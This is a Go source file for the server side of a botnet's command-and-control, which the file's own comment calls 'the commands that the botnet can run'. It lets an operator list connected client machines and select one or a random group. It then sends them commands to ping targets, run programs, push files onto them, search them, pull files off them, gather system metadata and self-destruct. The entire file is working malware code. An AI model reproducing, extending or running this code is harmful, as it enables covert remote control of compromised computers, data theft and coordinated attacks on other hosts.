package connection

import (
	"fmt"
	"net"
	h "server/util/header"
)

/*
*All the commands that the botnet can run
*/

//*Shows number of all active connection to server
func (s *Server)ShowActiveConns(){
	s.mu.Lock()
	defer s.mu.Unlock()
	fmt.Println(h.I, s.Activeconns, "Client(s) currently connected")
}

//*Lists all client IPs connected to the server
func (s *Server) ListClients() {
	s.mu.Lock()
	defer s.mu.Unlock()
	
	if len(s.Clients) == 0 {
		fmt.Println(h.E, "No Clients")
		return
	}
	
	fmt.Println(h.I, "Current Clients:")
	for _, client := range s.Clients {
		remoteAddr := client.Conn.RemoteAddr().String()

		disconnected := false
		select {
		case <-s.DisconnectedClients:
			disconnected = true
		default:
		}

		if !disconnected {
			fmt.Printf("\t"+h.L+" Client %d: %s\n", client.ID, remoteAddr)
		}
	}
}


//*Makes the selected ID the active Client
func (s *Server)SelectActiveClient(ID int64, conn net.Conn){
	if ID >= 0{
		s.ActiveClient = ID
		fmt.Println(h.K, "Active Client is now:", s.ActiveClient)
	}else{
		fmt.Println(h.E, "Invalid number")
	}
}

//*Prints current active client
func (s *Server)CheckActiveClient(conn net.Conn){
	fmt.Println(h.I, "Current Active Client", s.ActiveClient)
}



/*
* Creates a group of Clients of amount size
* random clients are selected to be part of the group
*/
func (s *Server)SetClientGroup(amount int, conn net.Conn){	
	if amount < 0{
		fmt.Println(h.E, "Invalid amount")
		return
	}
	shuffledClients := s.Clients
	
	ShuffleList(shuffledClients)
	
	var newGroup []int64

	for i := 0; i< amount && i < len(shuffledClients); i++{
		newGroup = append(newGroup, shuffledClients[i].ID)
	}
	
	s.ClientGroup = newGroup

	fmt.Println(h.K, "random client group assigned")
}



//*Prints the current active client group
func (s *Server)CheckClientGroup(conn net.Conn){
	if len(s.ClientGroup) == 0{
		fmt.Println(h.E, "The Client Group is empty")
		return
	}


	fmt.Println(h.I, "Current Client Group Members:")
	for _, c := range(s.ClientGroup){
		fmt.Println("\t", h.L, "Client:", c)
	}
}


//*Pings address specified by input
func (s *Server) ClientPing(addr, mode string, conn net.Conn) {
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := client.Conn.Write([]byte("ping " + addr)); err != nil {
					fmt.Println(h.E, "Error sending ping to active client:", err)
				} else {
					fmt.Println(h.K, "Ping sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := client.Conn.Write([]byte("ping " + addr)); err != nil {
						fmt.Println(h.E, "Error sending ping to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "Ping sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "Ping Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("ping " + addr)); err != nil {
				fmt.Println(h.E, "Error sending ping to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "Ping sent to client", client.ID, "successfully.")
			}
		}
	}
	
}


//*Runs specified app on detected os by abs path on client side
func (s *Server)ClientRunApp(app, mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := conn.Write([]byte("run " + app)); err != nil {
					fmt.Println(h.E, "Error sending run command to client", err)
				} else {
					fmt.Println(h.K, "Run command sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := conn.Write([]byte("run " + app)); err != nil {
						fmt.Println(h.E, "Error sending run command to client", err)
					} else {
						fmt.Println(h.K, "Run command sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "Run command Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("run " + app)); err != nil {
				fmt.Println(h.E, "Error sending run command to client", err)
			} else {
				fmt.Println(h.K, "Run command sent to client", client.ID, "successfully.")
			}
		}
	}
}



//*Sends a file to client side
func (s *Server)ServerSendFile(file, mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if err := s.SendFileToClient(file, client); err != nil {
					fmt.Println(h.E, "Error sending file to active client:", err)
				} else {
					fmt.Println(h.K, "File sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if err := s.SendFileToClient(file, client); err != nil {
						fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "File Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if err := s.SendFileToClient(file, client); err != nil {
				fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
			}
		}
	}
}

//*Searches for a file on the client side
func (s *Server)ClientSearchFile(file, mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := conn.Write([]byte("search " + file)); err != nil {
					fmt.Println(h.E, "Error sending command to client", err)
				} else {
					fmt.Println(h.K, "Search command sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := conn.Write([]byte("search " + file)); err != nil {
						fmt.Println(h.E, "Error sending command to client", err)
					} else {
						fmt.Println(h.K, "Search command sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "Search command Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("search " + file)); err != nil {
				fmt.Println(h.E, "Error sending command to client", err)
			} else {
				fmt.Println(h.K, "Search command sent to client", client.ID, "successfully.")
			}
		}
	}	
}

//*Tells client to return the current path that they are located in
func (s *Server)ClientEntryPoint(mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := client.Conn.Write([]byte("entry")); err != nil {
					fmt.Println(h.E, "Error sending entry command to active client:", err)
				} else {
					fmt.Println(h.K, "entry command sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := client.Conn.Write([]byte("entry")); err != nil {
						fmt.Println(h.E, "Error sending entry command to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "entry command sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "entry command Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("entry")); err != nil {
				fmt.Println(h.E, "Error sending entry command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "entry command sent to client", client.ID, "successfully.")
			}
		}
	}
}


//*Downloads a file from client side to Server side
func (s *Server)ClientDownFile(file, mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if err := s.RecvFileFromClient(client, file); err != nil {
					fmt.Println(h.E, "Error sending Command to active client:", err)
				} else {
					fmt.Println(h.K, "Command sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if err := s.RecvFileFromClient(client, file); err != nil {
						fmt.Println(h.E, "Error sending Command to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "Command sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "File Sent to group successfully")

	default:
		for _, client := range s.Clients {
			if err := s.RecvFileFromClient(client, file); err != nil {
				fmt.Println(h.E, "Error sending Command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "Command sent to client", client.ID, "successfully.")
			}
		}
	}
}

//*Disconnects a clients connection to the server
func (s *Server)ClientSelfDestruct(mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := client.Conn.Write([]byte("blowup")); err != nil {
					fmt.Println(h.E, "Error sending blowup command to active client:", err)
				} else {
					fmt.Println(h.K, "blowup command sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := client.Conn.Write([]byte("blowup")); err != nil {
						fmt.Println(h.E, "Error sending blowup command to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "blowup command sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "blowup command Sent to group successfully")

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("blowup")); err != nil {
				fmt.Println(h.E, "Error sending blowup command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "blowup command sent to client", client.ID, "successfully.")
			}
		}
	}
}

//*Returns metadata of client: operating system, connection, id
func (s *Server) GetMetaData(mode string, conn net.Conn){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := client.Conn.Write([]byte("metadata")); err != nil {
					fmt.Println(h.E, "Error sending metadata command to active client:", err)
				} else {
					fmt.Println(h.K, "metadata command sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := client.Conn.Write([]byte("metadata")); err != nil {
						fmt.Println(h.E, "Error sending metadata command to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "metadata command sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "metadata command Sent to group successfully")

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("metadata")); err != nil {
				fmt.Println(h.E, "Error sending metadata command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "metadata command sent to client", client.ID, "successfully.")
			}
		}
	}
}